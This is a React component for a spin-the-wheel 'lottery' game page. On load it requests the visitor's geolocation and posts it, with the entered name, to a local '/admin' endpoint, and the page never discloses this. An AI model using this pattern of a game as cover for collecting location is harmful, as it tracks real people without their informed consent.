import { useState, useEffect } from "react";
import axios from "axios";
import "./App.css";
export default function App() {
  const [randomRotation, setRandomRotation] = useState("0deg");
  const [rotation, setRotation] = useState(false);
  const [data, setData] = useState({
    name: "",
    longitude: null,
    latitude: null,
  });
  const [namely, setName] = useState("");
  useEffect(() => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(function (position) {
        setData((preData) => ({
          ...preData,
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
        }));
      });
    } else {
      console.log("Geolocation not found in your browser");
    }
  }, []);
  useEffect(() => {
    axios
      .post("http://localhost:8080/admin", {
        name: data.name,
        location: { latitude: data.latitude, longitude: data.longitude },
      })
      .then((response) => {
        console.log(response);
      })
      .catch((err) => {
        console.log(err);
      });
  }, [data]);
  function handleChange(event) {
    const { value } = event.target;
    setName(value);
  }
  function handleClick(event) {
    setData((prevData) => ({
      ...prevData,
      name: namely,
    }));
    setRandomRotation(`${Math.random() * 3600}deg`);
    setRotation(true);
  }
  useEffect(() => {
    console.log(data);
  }, [data]);
  return (
    <div className="main-container">
      <h1>Welcome to the lotery system</h1>
      <p>Submit your name and spin the wheel of luck</p>
      <input type="text" name="name" onChange={handleChange} />
      <button onClick={handleClick}>Submit</button>
      <div
        className="spinwheel"
        style={{
          "--random-rotation": randomRotation,
          animation: rotation ? `spinwheel 5s` : "none",
        }}
      >
        <div className="price"></div>
      </div>
      <p>This is a game and dosenot involve gambling play in limit</p>
    </div>
  );
}
